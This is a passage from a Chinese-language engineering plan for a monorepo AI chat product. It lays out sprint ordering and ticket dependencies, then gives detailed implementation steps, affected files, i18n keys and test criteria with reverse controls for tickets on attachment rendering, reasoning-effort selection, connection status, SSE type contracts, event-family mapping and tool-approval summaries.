3. 每条票的验收判据至少含一条**反向对照**（把实现改坏它必须变红）。只有"跑绿"没有反向对照的条目按本仓规矩等于没取证。

### 10.1 排期与依赖图（S9–S14，续 V3 的 S1–S8 与本文 §五）

顺序不是按"哪条最疼"，而是按**判据先行、契约先行、爆炸半径递增**：尺子不修，后面每一条结论都无法复核；契约不统一，跨端与界面各自追平；服务端与凭据面放最后，因为它们的回退成本最高。

| Sprint | 内容 | 票 | 退出闸（跑得出红/绿的那一句） |
| --- | --- | --- | --- |
| **S9 尺子与地基** | 先让结论可复核 | D167 ✅已修、D139、D140、D157 残余、D168/D169（**归属他人，只登记不代做**） | `node docs/benchmark-evidence/2026-09/reconcile.mjs --self-test`（现 3/3）+ `pnpm check:plan-task-state` + 每道新门 `--self-test` |
| **S10 契约与协议建模** | 一个事实一份描述 | D132 ✅已修、D133、D151、D152、D153、D154、D155 | `pnpm --filter @ihui/shared typecheck` + `node scripts/check-agent-event-parity.mjs` + `node scripts/check-gate-face-discipline.mjs` |
| **S11 对话流信息保真（web）** | 用户当场看得见 | D129、D130、D131、D134、D149、D163、D164、D166 | `pnpm --filter @ihui/web typecheck` + `node scripts/check-v3-62-conversation-mount.mjs` + 各票自带的 DOM 断言 |
| **S12 决策面与审批** | 点下去之前看得懂 | D142、D143、D158、D159、D161、D162（**四条需 §24 拍板，预填见 §十一**） | `node scripts/check-mode-permission-matrix.mjs` + `pnpm check:digest-name` + 审批链路 e2e |
| **S13 跨端可达性** | web 做完不等于做完 | D135、D136、D137、D138、D148 | `node scripts/check-background-task-type-parity.mjs` + 端内挂载判据（各票第 6 栏）+ `pnpm -r build` |
| **S14 引擎 / 凭据 / 可观测** | 服务端，回退最贵 | D144、D145、D146、D147 | `cd apps/ai-service && mypy app --ignore-missing-imports --strict` + `node scripts/check-memory-owner-binding.mjs` + `node scripts/check-doom-loop-parity.mjs` |
| 横切 | 环境与他人 | D150（等 web+api+PG+Redis 起齐）、D156（否证入库，无排期）、D160（拆票纪律，已落成本节格式） | D150 的闸是"能真跑一次对话流并把帧序列贴出来"，在此之前**禁止**任何视觉结论写成本仓已验证 |

### 10.2 硬依赖（谁挡谁，全部来自各票第 7 栏现读，不是推测）

- **D139 挡 D135 / D136 / D138**：对话流事件 parity 门现在只护 web，其余四端"缺回调"结构性不可见。不先扩端消费面，端可达性各票修完也没人判对错（票面自己写的顺序，本表照它排）。
- **D152 的前置是"goal 有服务侧主副本"**：GoalCard 已挂载（本仓现读 `ai-side-panel-tools.tsx:525`），缺的是主副本；先加下行事件会让"登记而无生产"那条 parity 规则反过来阻断。
- **D153 / D154 的前置是 `ws-broadcast` 有生产者**：该装饰器在 HEAD 面零生产者（又一格"造好没装车"），载体没接上就发事件等于发空帧。
- **D158 不再需要造机制**：前缀规则的存储/匹配/撤销/枚举/过期五件套已在 `approval_persistence.py`（现读 133/171/256/272/298 行），本票射程缩为"接线 + 第四档 UI + 规则面板"。**明令禁止新建第二份规则存储。**
- **D167 挡所有族级数字**：修复前本目录里任何"某族 N 处"的聚合都不可用（`tagPill` 被虚记到 87 行）。已修，逐条导出件按新尺子重生成。
- **D168 / D169 归台账与工具线持有人**：本档只登记，不代裁；照 §16 的越权禁令。

### 10.3 本轮已经落地的两格（不是计划，是已完成，附取证）

- **D132**：SSE 判别联合补 `usage` / `tool-delta` 两名，并把那句自称"编译期穷尽"的恒绿检查换成真判据。取证：改前 `pnpm --filter @ihui/shared typecheck` RC=2 且两条 TS2322 分别点名这两名；改后 shared typecheck / shared 全量测试 / api-client typecheck 均 RC=0；反向对照把 `citations` 的值改成 `chunk` ⇒ vitest RC=1 单条红，还原后测试文件 blob 逐字节相同。提交 `608121c87`。
- **D167**：对账器三处修完（换节清族 / 非中文原文判 skip 且不再被 Jaccard 误判成 L2 / 语言包语料改走 HEAD 面），新增 `--self-test` 三条构造面用例，修复前实测 **0/3**、修复后 **3/3**；五份逐条导出件按新尺子重生成，MISS 合计 486 → **459**（差的 27 条全在附录 C 的 CSS 属性名与样式值）。

### 10.4 逐族实施级计划正文

以下七段由各族代理产出，主代理逐条抽查了其中"推翻票面"的六条最关键判断（D132 / D137 / D143 / D147 / D151 / D158，抽查命令与结果见 §十一）。正文未做二次润色，保留 `未取证` 标记原样。

## 族 A · 对话流信息保真与 SSE 契约建模（D129 D130 D131 D132 D133 D134）

> 全部现状锚点为 2026-09-29 在 `git show HEAD:` / `git grep … HEAD` 面上逐条现读；与票面不一致处均写明"票面说 X / 现读为 Y / 命令 Z"。派单前重跑各条命令取现值。

### D129 对话流保真①:用户消息按纯文本渲染,自传附件显示成 Markdown 源码(承 V4 #87;取证 2026-09-28)

1. 目标行为：用户自己上传的图片/代码/文件在自己的气泡里以缩略图与代码块呈现，不再看到 `![…]`、三反引号、`> 📎` 字面量。
2. 现状锚点（均 HEAD 面现读复验）：
   - `apps/web/src/components/chat/message-list/MessageItem.tsx:884` 用户分支 = `<p className="whitespace-pre-wrap break-words text-[15px] leading-relaxed">{m.content}</p>`，零 Markdown 解析。复验：`git show HEAD:apps/web/src/components/chat/message-list/MessageItem.tsx | grep -n 'whitespace-pre-wrap break-words text-\[15px\]'` → `884:`（与票面一致）。
   - 发送侧拍平：**票面说 `apps/web/src/hooks/use-chat/use-message-send.ts:256-280`，现读为 `apps/web/src/hooks/use-message-send.ts:256-277`（不在 use-chat/ 子目录下；该子目录列表面无此文件）**。图片→`![]()`、视频→`<video>`、长文本→fenced、其余→`> 📎`。复验：`git show HEAD:apps/web/src/hooks/use-message-send.ts | sed -n '256,277p'`。
   - 判定表在 `apps/web/src/hooks/use-message-references.ts:45`（`UPLOADABLE_EXTENSIONS = new Set`）与 `:118-127`（MIME→`'image'|'video'|'file'`）。`ChatMessage`（`packages/types/src/chat.ts:80`）现读**无** `attachments` 字段。
   - 已存在的等价物（否证"要新造渲染器/预览器"）：助手侧 `MarkdownStream`（`apps/web/src/components/ai/markdown-stream.tsx:681`，props 仅 `{content,isStreaming,collapseLines}`）**不含 rehype-raw**（不渲染 HTML，安全默认成立），其 `img` 映射 `MarkdownImage`（:505/:779）点击已走 `useWorkPanelStore.openPanel`——D41 预览链路现成，止血直接继承，**不造第二个图片预览器**。
3. 改动分解：
   - 步骤1【止血·web】`MessageItem.tsx` 用户分支改 `<MarkdownStream content={m.content} />` 外包原字号类容器；`<video>` 因无 rehype-raw 仍以文本现身，需在发送前的展示投影里把该形态识别为视频附件（见步骤2 判定表复用），本步至少在交付里如实登记"视频档仍字面量"。
   - 步骤2【根治·契约】`packages/types/src/chat.ts` 的 `ChatMessage` 加可选 `attachments?: {kind:'image'|'video'|'file'|'text';url?:string;name:string;bytes?:number}[]`；发送侧（`doSend`）同时写结构化字段与正文投影（正文投影降级为"无字段时的兼容投影"）；附件类型判定表从 `use-message-references.ts` 上移到 `packages/shared`（发送侧与渲染侧共用一份，禁第二份）。
   - 步骤3【渲染】`MessageItem.tsx` 用户分支按 `m.attachments` 出附件卡（缩略图/文件徽章），点开走 `MarkdownImage` 同一 work-panel 出口。
4. 受影响文件：`apps/web/src/components/chat/message-list/MessageItem.tsx`、`apps/web/src/hooks/use-message-send.ts`、`apps/web/src/hooks/use-message-references.ts`、`packages/types/src/chat.ts`、`packages/shared/src/chat/attachment-kind.ts`[新]、`apps/web/src/components/chat/message-list/__tests__/message-item-user-attachments.test.tsx`[新]。
5. 跨端与 i18n：miniapp 与 RN 的用户气泡是否同型需现读（命令：`git grep -n "whitespace" HEAD -- apps/miniapp-taro/src/pages/chat apps/mobile-rn/src/screens/ChatScreen.tsx packages/app/src/features/chat`）——同型则同批改用共享判定表渲染；`attachments` 为可选字段，旧客户端不写不红。文案：附件卡 aria `chat.attachments.imageAlt`="图片附件：{name}"、`chat.attachments.fileCard`="{name}（{size}）"，五语言同批（§19）。
6. 验收判据：
   - `pnpm --filter @ihui/web test -- message-item-user-attachments` 绿：喂内容含 `![photo](https://x/a.png)`、fenced 代码、`> 📎 报告.docx` 三条用户消息，断言气泡 DOM 内 `textContent` 不含 `'!['`、`'```'`、`'> 📎'`，且图片节点存在、点击触发 `useWorkPanelStore.openPanel`（mock 断言调用 1 次）。
   - 反向对照：把 `MessageItem.tsx` 用户分支临时改回 `<p>{m.content}</p>` 复跑 ⇒ 上述断言必红（证明判据真在守渲染路径而非快照）。
7. 依赖与顺序：止血可独立派；步骤2 动落库形态（`apps/api` 消息持久化）前按 §7 删除安全核存量消息读取兼容，另计半票；判据开工前跑 `git show HEAD:apps/api/src/routes | grep -c chat` 式核对待——以现读为准。
8. 风险与回退：展示层回退 = revert 一枚 commit；最大风险是助手侧渲染器对超长粘贴 fenced 块套上折叠/代码运行按钮等助手语义（`useCodeBlockRun`），止血步需断言"用户气泡内不出现『运行』按钮"。**需 §24 拍板**（仅步骤2：改变消息持久形态与跨端契约）——预填方案：`attachments` 可选数组 + 正文投影保留一个版本周期 + 历史消息无字段读作 `[]` 不报错。

### D130 对话流保真②:推理强度档位前端零通道(承 V4 #88;取证 2026-09-28)

1. 目标行为：用户能在对话输入区选"想深一点/快一点"（minimal/low/medium/high），且该选择真的改变上游请求与落库档位；不支持的模型置灰并给原因。
2. 现状锚点（现读复验）：
   - 前端零通道成立：`git grep -inE "reasoningEffort|reasoning_effort" HEAD -- packages/api-client packages/types apps/web/src packages/shared` → 退出码 1（零命中）。语义等价扫（`thinkingBudget|effortLevel|\beffort\b` 同面）仅命中 `best-effort` 注释 ⇒ 无别名实现，非假差距。
   - 后端**票面说"只需接住入参"，现读为整条入参面都没有**：`LLMCompleteRequest`（`apps/ai-service/app/routers/llm.py:1617`）现读零 `reasoning*` 字段（命令：`git show HEAD:apps/ai-service/app/routers/llm.py | sed -n '1617,1760p' | grep -c reasoning` → 0）；钉扎体系在位：`app/core/reasoning_effort_pin.py:108` `known_efforts={minimal,low,medium,high}`，消费点 `services/agent_loop_v2.py:2196-2219`。
   - 先例（别造第二份 wire 名）：`apps/api/src/routes/ai-vendors/_shared.ts:64` 已有 `reasoning_effort: z.string().optional()`（非封闭枚举、非 chat 链路）；主聊天链路 apps/api 入参白名单 = `apps/api/src/routes/ai-chat-stream.ts:56` `chatStreamSchema`（camel 键入、`:496` 转 snake 出）。
   - 档位三处等值已有守门：`scripts/check-model-capacity-parity.mjs` C5/C6（known_efforts ≡ `apps/cli/src/subagents/precedence.ts:44` ≡ cli `types.ts:24`）；`packages/types` 现读**不**导出 `ReasoningEffort`（`git grep -n ReasoningEffort HEAD -- packages/types/src` → 0）。
   - 落点：`packages/api-client/src/client.ts` `StreamChatOptions`（temperature/topP 同区，:2114 `extraBody` 合并点）；web 控件面 `model-selector.tsx`（5 档 tier 轴）与 `sampling-params-panel.tsx`（`chat.sampling` 命名空间）；能力布尔底座 `packages/types/src/model-catalog.ts:37` `ModelCapabilityKey` 含 `'reasoning'`。
3. 改动分解：步骤1【契约】`packages/types` 新增封闭 `ReasoningEffort`（值同 known_efforts，注明唯一源）并把 C5/C6 扩到该新落点（同枚提交，禁第四份）；步骤2【通道】`StreamChatOptions.reasoningEffort?`→body（camel）、`ai-chat-stream.ts` schema 加 `reasoningEffort: z.enum([...]).optional()` 并转 `reasoning_effort` 出、`LLMCompleteRequest` 加同名可选字段并在组装 gateway 调用处喂进 `reasoning_effort_for_request` 的选定档（开工前现读 `llm.py` 该请求的下游传递链）；步骤3【控件】model-selector 旁第三轴，档位可用性由 `capabilities.reasoning` 驱动，缺失按"未知不误藏"先例降级为可选+后端钉档，置灰 tooltip 给原因；步骤4【取证】`turn_metadata.py` 落库档位断言。
4. 受影响文件：`packages/types/src/reasoning-effort.ts`[新]、`packages/types/src/model-catalog.ts`、`packages/api-client/src/client.ts`、`apps/api/src/routes/ai-chat-stream.ts`、`apps/ai-service/app/routers/llm.py`、`apps/web/src/components/chat/model-selector.tsx`（或其档位子组件）、`scripts/check-model-capacity-parity.mjs`、`packages/i18n/messages/{web,miniapp,mobile-rn,cli}/{zh-CN,ja,ko,en,zh-TW}.json`、`apps/ai-service/tests/test_reasoning_effort_intake.py`[新]。
5. 跨端与 i18n：通道在 packages/types/api-client ⇒ web/RN(3 屏)/extension/cli 一次到位；miniapp 走自有传输层（`apps/miniapp-taro/src/api/index.ts` + `src/lib/sse.ts`），其请求 body 构造同批加字段；控件首落 web，miniapp 输入区同批改，RN/desktop 标注"通道在位、控件另票"（非平台独占，只是排期）。键：`chat.reasoningEffort.label`="推理强度"、`.minimal`="极简"、`.low`="快速"、`.medium`="均衡"、`.high`="深思"、`.unsupported`="该模型不支持选择推理强度"，五语言同批 + `check-i18n-keys` parity。
6. 验收判据：
   - `node scripts/check-model-capacity-parity.mjs --strict` 绿且档位面从三处变四处（输出行现读点名）；反向对照 A：把 `packages/types` 里任一档删掉 ⇒ 该门必红点名两侧。
   - ASGI in-process 测试（本机无 PG 不受阻，D150 型）：`python -m pytest apps/ai-service/tests/test_reasoning_effort_intake.py -k turn_metadata` 绿——同一模型分别带 `reasoning_effort:"low"|"high"` 各发一轮，断言两次传给上游的 kwargs 档位不同（mock provider 层捕获，**不是**断言前端 store）。反向对照 B：删掉 `ai-chat-stream.ts` 的转发行 ⇒ 第二条断言必红。
7. 依赖与顺序：无前置票；与守门 147 的扩面必须同票同 commit（否则新落点天然脱离尺子）。`turn_metadata` 真库落库验证在本机不可用（未取证：本机无 PG 端口，运行时档只能到 in-process）。
8. 风险与回退：字段可选 ⇒ 旧客户端零行为变化，回退 = revert；主要风险是"前端选了档但 provider 不支持"被后端钉扎静默回落——处置：回落必须在 SSE `usage`/`done` 或徽章里可见（与 D132 联动，登记不静默）。**需 §24 拍板**（新对外能力+用户可见控件）——预填方案：即上述四档 + 键文案 + 置灰条件 `capabilities.reasoning!==true` 时才灰（未知不灰，沿用 `model-tier-utils.ts:68-79` 既有"未知不误藏"语义）。

### D131 对话流保真③:连接状态件从未上屏 + 重连后待决审批恢复无取证(承 V4 #89;取证 2026-09-28)

1. 目标行为：断线/重连期间界面有常驻状态可读（不止一条会消失的 toast）；断线窗口里没点的审批卡恢复后仍可见可操作。
2. 现状锚点（现读复验）：
   - 否证沿用且复核为真：重连机制在位——`packages/api-client/src/client.ts:2072`（`maxRetries ?? STREAM_MAX_RETRIES`）、`:2122-2123`（带 `Last-Event-ID` 头）、`:3448-3449`（从 `id:` 行推游标）——**票面说 2078/2129/3443，现读如上**；`apps/web/src/hooks/use-chat/send-message.ts:767` 已消费 `onReconnect` 弹 toast（`send-answer.ts:292` 同形）。
   - 缺口 A 复核为真：`git grep -n "connection-status" HEAD -- apps/web` 命中 = 组件自身 + `apps/web/tests/agent-task-progress-pane.test.tsx`（:460 import 等）⇒ 生产面零挂载；`deriveConnectionState` 亦只有测试消费。组件已 i18n 就绪（`ai.pane` 命名空间，:90），挂载为纯接线。
   - 缺口 B 新增事实（票面没有的第三处机制）：**apps/api 侧已有标准 SSE 重放**——`apps/api/src/routes/ai-chat-stream.ts:296-351`：`replayKey=conversationId:messageId`、15s 宽限接管 + 60s 缓冲保留 + 窗口有洞/过期时点名丢弃后整轮重生成（`getReplayWindowStatus`）。`tool-approval` 帧由 `apps/ai-service/app/routers/llm.py:3770` 发出、经该代理进 replay buffer ⇒ "服务端待决表重放"是否还要做，取决于现测：断线前**已送达**（id ≤ Last-Event-ID）的审批帧必然不在重放段内，卡片丢不丢取决于前端 store 是否留存；页面刷新续接走另一条 `POST /api/chat/resume`（`chat-resume.ts:20-26`，"已生成前缀续写"，不重放 SSE buffer），审批卡是否恢复**未取证：需构造场景**。`agent_engine.py` 两张待决表现读在 `:1945/:1948`（注册 :6227/:6815）——**票面说 1817/1832，已漂**。
3. 改动分解：步骤1【取证，先于任何修复】写集成测试复现三态：(a) 纯断线重连（store 未清）；(b) 断线且组件卸载未刷新；(c) 刷新走 chat-resume。记录审批卡在 (a)(b)(c) 是否可操作，结论（含否证）写回本票，拿不到 (c) 丢的证据前**不改**服务端。步骤2【接线】把 `ConnectionStatusBar` 挂进 `MessageList.tsx`（与 D45 聚合档位条同位），状态源：`send-message.ts` 的 onOpen/onReconnect/onError/stream 收尾四事件 → `useChatStore.connectionState`，经 `deriveConnectionState` 推导（开工前现读 `connection-status.tsx:202` 的形参语义）。步骤3【条件修复】若步骤1 证实 (c) 丢：优先在 `chat-resume.ts` 续接响应尾部重推"该消息仍挂着的未结算待决"（数据源 ai-service `_permission_requests`/`_elicitation_requests`，带主记录，出口现成），**不得**前端本地缓存兜。
4. 受影响文件：步骤1/2 必改：`apps/web/src/components/chat/message-list/MessageList.tsx`、`apps/web/src/hooks/use-chat/send-message.ts`、`apps/web/src/hooks/use-chat/send-answer.ts`、chat store（`packages/shared/src/stores` 的 useChat 工厂）、`apps/web/src/tests/connection-status-wiring.test.tsx`[新]、`apps/api/tests/chat-stream-replay-approval.test.ts`[新]；步骤3 条件改：`apps/api/src/routes/chat-resume.ts`、`apps/ai-service/app/services/agent_engine.py`（或其结算出口）。
5. 跨端与 i18n：常驻状态件首落 web；RN/extension 复用同一 api-client 事件但各自 UI 另票（登记事实：miniapp `apps/miniapp-taro/src/api/index.ts:375` 已有重连前缀去重与 `onReconnect` 钩子位，toast 档先例在）。无新文案（`ai.pane.sseStatus.*` 五语言键在位，复验：`git show HEAD:packages/i18n/messages/web/zh-CN.json | grep -n '"reconnecting"'` 非空；若挂主聊天区需要新键再走 §19）。
6. 验收判据：
   - 挂载：`git grep -n "progress-sections/connection-status" -- apps/web/src ':!apps/web/src/components/ai/progress-sections/connection-status.tsx'` 非空（≥1 生产 importer，排除测试面）；反向对照：从 `MessageList.tsx` 删该 import ⇒ `pnpm --filter @ihui/web test -- connection-status-wiring` 红。
   - 行为：`pnpm --filter @ihui/web test -- connection-status-wiring` 断言 mock onReconnect 后状态条文本 `reconnecting`、恢复后 `connected` 且**已到达内容未被清空**；`node scripts/... ` 不新增守门，取证以测试为准。反向对照：给状态条喂恒 `connected` ⇒ 第一断言红。
7. 依赖与顺序：步骤2 独立可行；步骤3 严格后置于步骤1；与端可达性票（RN/miniapp 审批帧接通）同族但**不互顶**（那条管收不到，这条管收到后丢）。
8. 风险与回退：接线纯增量可 revert；步骤3 动服务端重放序则须断言"重推不产生第二次副作用待决"（同 id 幂等，参照 engine.py 结算 `_principal_allows` 成对用例纪律）。**需 §24 拍板**（常驻状态条=用户可见变化）——预填方案：仅流进行中/异常时显示（connected 稳态不占行高），位置在消息流容器顶缘，样式沿用 `ai.pane` 现件。

### D132 契约建模:usage 帧在 TS 判别联合里没有成员(承 V4 #90;取证 2026-09-28)

1. 目标行为：usage/工具 diff 帧的字段名和类型成为编译期契约，后端改字段六端立刻红，计量徽章不再各拿 `unknown` 自断言。
2. 现状锚点（现读复验）：
   - `contract.ts:51` `USAGE:'usage'` ✓；主面现读 30（`git show HEAD:packages/shared/src/sse/contract.ts | awk '/^export const SSE_EVENTS/,/^}/' | grep -cE "^  [A-Z_]+:"` → 30，与票面同）。
   - **现读比票面多一格**：判别联合（:115-435）成员现读 28（`grep -oE "type: '" | sort -u | wc -l`），缺的不止 `usage`，还有 `tool-delta`（`comm -23` 两清单实证）。
   - wire 真实形状以生产端为准：`apps/ai-service/app/routers/llm.py` usage emit = `{type:'usage', messageId, usage:{promptTokens,completionTokens,totalTokens,reasoningTokens}, timing:{firstTokenMs,durationMs}, model, costUsd}`；`tool-delta` = `{toolCallId,seq,partialText,truncated?}`（`contract.ts:68-70` 注释 + `sse_contract.py` `SSEEventContract("tool-delta",…)`）。**票面提议的 `inputTokens/cacheReadTokens/costMicroUsd` 与实测 wire 不符，照抄会造出对不上任何真实帧的类型——按实测字段建成员。**
   - 既有"穷尽性"断言是恒绿的（本票存在理由）：`packages/shared/src/sse/__tests__/contract.test.ts:117` 的 `PAYLOAD_TYPE_BY_KEY: Record<keyof typeof SSE_EVENTS, SSEEventName>` 只判"映射值∈事件名集"，从不判该名字在 `SSEEventPayload` 里有无成员，而头注（:14/:114-116）自称"新增事件漏写 payload 类型时 tsc 编译报错"——现读证伪（usage/tool-delta 在表内却不在联合里而 tsc 全绿）。
   - 消费面：api-client 已有 `UsageEvent` 接口（client.ts:989）与 `onUsage`（:1138，解析 :2963-2991）；web 徽章 `message-item-parts.tsx` 现读 `UsageBreakdown({usage: unknown})` + `as Record<string, unknown>`（**票面说 :231/295，现读 :170-178/:232-236**）；估算位 `live-usage.ts:35`。
3. 改动分解：步骤1 给 `SSEEventPayload` 补 `usage`、`tool-delta` 两个判别成员（字段逐字取自上面实测 wire，禁 `any`，嵌套 usage 封闭四键）；步骤2 把 contract.test.ts 的假穷尽替换为真编译期判据：`type _Missing = Exclude<SSEEventName, SSEEventPayload['type']>`，`const _exhaustive: _Missing extends never ? true : false = true`；步骤3 `UsageBreakdown`/徽章改吃该判别类型（去掉 `as Record<string, unknown>`），估算口径继续走 `UsageEvent` 归一化，不改后端计费源。
4. 受影响文件：`packages/shared/src/sse/contract.ts`、`packages/shared/src/sse/__tests__/contract.test.ts`、`apps/web/src/components/chat/message-list/message-item-parts.tsx`、`packages/api-client/src/client.ts`（仅当把 onUsage 类型改为从 shared 成员派生）。
5. 跨端与 i18n：契约层改动，api-client 一源 ⇒ web/RN/extension/cli 同步受益；miniapp 自有 dispatch（`apps/miniapp-taro/src/api/index.ts` switch）若已按 usage 名硬编码，类型改后跑其 typecheck 即可，无文案。
6. 验收判据：
   - `pnpm --filter @ihui/shared typecheck` 绿；且 `pnpm --filter @ihui/web exec tsc --noEmit`（含 message-item-parts 改动文件）绿。
   - 计数对账（票面要求的断言，进 contract.test.ts）：`expect(new Set(Object.values(SSE_EVENTS)).size).toBe(new Set(UNION_TYPE_NAMES).size)`——`UNION_TYPE_NAMES` 由测试内维护的 `SSEEventPayload['type']` 运行时清单或镜像表得出。
   - 反向对照（两条各必红）：① 从联合里删 `usage` 成员 ⇒ `pnpm --filter @ihui/shared typecheck` 红在 `_exhaustive` 行；② 把 `message-item-parts.tsx` 一处字段拼成 `promptTokens_x` ⇒ 编译红（证明类型真在守，不是 `as` 遮羞）。
7. 依赖与顺序：可独立派；与 D133 同批时本票先行（families 表登记的是补全后的成员集）。注意约束：**不得顺手把任何新事件族并进 `SSE_EVENTS`**——本票只补成员不补名字；两族 frozenset↔契约双射由 `apps/ai-service/tests/test_sse_contract.py::test_contracts_align_with_events` 与 `check-agent-event-parity.mjs` 把关，新增事件必须"两侧同批+生产落点+消费方"三段走。
8. 风险与回退：纯类型层，回退 = revert；风险是补出的成员与真实帧字段名漂移 ⇒ 用步骤1 的取证命令（现读 emit 处）把字段钉在交付描述里。无需 §24（不改变用户可见行为）。

### D133 契约建模:两套 SSE 事件命名族并存且无映射表(承 V4 #91;取证 2026-09-28)

1. 目标行为："这个事件属于对话流还是任务面板、谁生产、谁消费"一处可查；收到不认识的事件名时账面有计数点名，不再静默。
2. 现状锚点（现读复验）：
   - 两族并存：主面 30（同 D132）；`packages/shared/src/sse/agent-events.ts:28` `AGENT_TASK_EVENTS` 现读 15 名，**snake 与 kebab 混排**（`tool_call/tool_result/message_send/session_end` vs `tool-approval/permission-mode/self-heal/plan-step/terminal-delta/agent-status`）；与主面同名 5 个：`compaction/error/plan-step/thinking/tool-approval`（`comm -12` 实测）。`packages/shared/src/sse/families.ts` 不存在（`git ls-tree -r HEAD packages/shared/src/sse --name-only` 五文件，无它）。
   - 静默丢弃自陈：`contract.ts:273`（form_request 注释"写成 snake 会被**整帧静默丢弃**"）——票面 :271-275 现读命中该句。
   - 未识别事件的现状：api-client `routeLineByType` 的 `default: return null`（client.ts:3334），注释说"未知 type 走 fallback 全量调用"（dispatchTryParse 兜底逐个 tryParse）⇒ 无人计数无人点名；miniapp `dispatch(evt)` switch 同型静默；`packages/types/src/agent-runtime.ts:1417` `AgentSSEEvent` 确被 `scripts/check-agent-event-parity.mjs`（:216 段"1c"）当兜底契约扫，`agent-events.ts` 由同脚本 :427 段"1j"抽取——**parity 脚本已在读两族，缺的是"名字→族"登记与未知计数，不是又一把扫描**。
3. 改动分解：步骤1【单一源】新建 `packages/shared/src/sse/families.ts`：`SSE_FAMILIES = { chat: SSEEventName[], agent: AgentTaskEventName[], shared: (两者交集) }` + `familiesOf(name)` + `isKnownEventName(name)`，表内容由 `SSE_EVENTS`/`AGENT_TASK_EVENTS` **推导**（禁手抄清单——清单必然腐烂，AGENTS §4 教训）；步骤2【计数点名】api-client 消费 seam 在 `routeLineByType` default 分支与 fallback 全不命中处：`onUnknownEvent?.(type)`（`StreamChatOptions` 加可选回调）+ 开发态 `console.warn` 去重点名；web 挂一个 dev-only 计数 sink；miniapp dispatch default 同批点名；步骤3【防腐烂】`check-agent-event-parity.mjs` 新增判据：`SSE_EVENTS ∪ AGENT_TASK_EVENTS` 每名必须落 `families.ts` 至少一族，families 表出现面上没有的名 ⇒ 红。
4. 受影响文件：`packages/shared/src/sse/families.ts`[新]、`packages/shared/src/sse/index.ts`、`packages/shared/src/sse/__tests__/families.test.ts`[新]、`packages/api-client/src/client.ts`、`apps/miniapp-taro/src/api/index.ts`、`scripts/check-agent-event-parity.mjs`。
5. 跨端与 i18n：契约+计数层，无用户可见新 UI（计数出口 debug-only），六端经 shared/api-client 一致；无新键。
6. 验收判据：
   - `pnpm --filter @ihui/shared test -- sse/__tests__/families` 绿：表内每族成员 ⊆ 对应常量集、并集 = 两常量并集、5 个同名交叉项登记为 `shared`。
   - 未知计数（票面验收的执行版）：`pnpm --filter @ihui/api-client 测试`（若无独立 test 入口则 `pnpm --filter @ihui/web test -- sse-unknown-event`）喂假帧 `{type:'__bogus_event__'}` ⇒ 断言 `onUnknownEvent` 被调 1 次且实参为 `'__bogus_event__'`；**反向对照**：删 default 分支的点名调用 ⇒ 该断言红（只判"当前计数为 0"不成立，此条即判据有牙证明）。
   - `node scripts/check-agent-event-parity.mjs` 绿；反向对照：往 `SSE_EVENTS` 加一名而不进 families ⇒ 红点名该名。
7. 依赖与顺序：后置于 D132（families 推导要求联合已补全，否则登记"名字在、类型缺"的洞）。命名风格统一（snake 生产/camel 投影一层）是**另票范围**——本票只建表与计数，不得在本票改名（改名=改线格式=恒红风险）。
8. 风险与回退：纯增量；families.ts 若被后来者手改成第三份清单，由步骤3 的反向腐烂判据拦。回退 = revert。无需 §24（不改变用户可见行为）。

### D134 对话流保真④:工具参数是 JSON 裸 dump,不足以支撑当场批准(承 V4 #92;取证 2026-09-28)

1. 目标行为：批一条命令/一次删除前，卡片直接给出"跑什么命令、动哪个路径、有没有删除"结构化摘要，长内容可展开可搜索，而不是两秒内读 JSON。
2. 现状锚点（现读复验）：
   - **票面三处路径已漂**：`tool-call-card.tsx` 的 `JSON.stringify(args, null, 2)` 现读 `:1249`（票面 1247）；`stream-ui.tsx` 实为 `apps/web/src/components/chat/stream/stream-ui.tsx`（票面无前缀路径），`StreamCode` 定义 :430、硬封顶类 `max-h-[200px]` :451（票面 430-456 命中）；`tool-display.ts` 实为 `packages/shared/src/chat/tool-display.ts`，`describeToolCall` :370 ✓，subject/metric 两字段体系 :168-186 ✓。
   - 审批弹窗现状：`apps/web/src/components/ai/tool-approval-dialog.tsx` 三档 `once/session/always`（:160/:167-170）+ danger 徽章（:220）+ `argsPreview` 原样打印（:224-226 `{current.argsPreview || '{}'}`）。
   - 语义等价检查（防假差距）：**结构化摘要底座已存在**——`describeToolCall` 的 `ToolSubjectKind` 含 `'command'|'path'|'url'…` 且未登记工具按 path→url→query→command→name 试探（tool-display.ts:376-380）；审批帧 wire 已带 `danger_level`/`args_preview`（contract.ts 判别成员 :260-267 + `sse_contract.py` `SSEEventContract("tool-approval",…)`）。缺的是**这两样没有被审批卡用起来**，不是从零建分类。
   - 依赖面核实：`TOOL_EFFECT_SCOPES` 7 档在 `packages/types/src/tool-contract.ts:36`（none/workspace/repository/network/system/delegate-to-caller/ask-user）；但 `git grep -rln "effectScope" HEAD -- apps packages | grep -v test` 仅 2 文件（tool-contract.ts + `apps/cli/src/commands/spec-drift.ts`）⇒ 渲染面与运行时**零落地**，D142（票面 7428 行）未开工——与票面判断一致，"命令/删除两族"用 `subjectKind + args 键名 + danger_level` 即可先行，不等 D142。
   - "换个做法"出口现读不存在（web 面 `换个做法|retryDifferent` 0 命中；self-heal 仅 agent 任务流事件，`use-agent-runtime.ts:128`）。
3. 改动分解：步骤1【止血·摘要】审批卡与 tool-call-card 默认路径改吃 `describeToolCall` 产出（命令族=命令本体整段可见 + cwd 行 + `含删除动作` 徽章由 `rm|DROP|DELETE|format` 形状匹配驱动；写文件族=路径+增删行数），`argsPreview` 降级为"展开原文"入口；步骤2【可展开可搜索】`StreamCode` 加 `expandable?: boolean` + 文内查找（高亮命中数），保留 200px 默认高；步骤3【根治·条件】D142 落地后摘要分类改读 effectScope，删掉形状匹配的临时判据（留 TODO 锚点在本票号）；步骤4【另段】"换个做法"出口 = 与 D158（第四档审批）、V3 #45 协同的新能力，**不在本票实现**，登记为需 §24 的后续半票。
4. 受影响文件：`apps/web/src/components/ai/tool-approval-dialog.tsx`、`apps/web/src/components/ai/tool-call-card.tsx`、`apps/web/src/components/chat/stream/stream-ui.tsx`、`packages/shared/src/chat/tool-display.ts`（如需补 `commandHasDelete(args)` 纯函数）、对应 `apps/web/src/components/ai/__tests__/tool-approval-summary.test.tsx`[新]。
5. 跨端与 i18n：审批弹窗/卡片现读仅 web 有生产落点；RN/miniapp 审批帧接通本身在端可达性票（H 组）射程内，本票标注"待其接通时直接复用共享 `describeToolCall` 摘要"（这就是共享层的意义，禁端内重抄分类）。新键：`chat.approval.impact.command`="将执行命令"、`.delete`="包含删除操作"、`.path`="将修改文件"、`.expand`="展开完整参数"、`.search`="在参数中查找"，五语言同批。
6. 验收判据：
